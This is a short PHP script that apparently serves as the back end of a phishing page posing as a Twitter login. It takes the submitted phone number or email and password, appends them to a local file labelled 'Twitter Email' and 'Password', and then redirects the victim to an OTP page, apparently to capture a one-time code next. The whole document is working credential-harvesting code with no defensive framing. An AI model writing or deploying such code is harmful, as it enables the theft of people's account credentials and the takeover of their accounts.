<?php
file_put_contents("usernames.txt", "Twitter Email: " . $_POST['phone_or_email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>
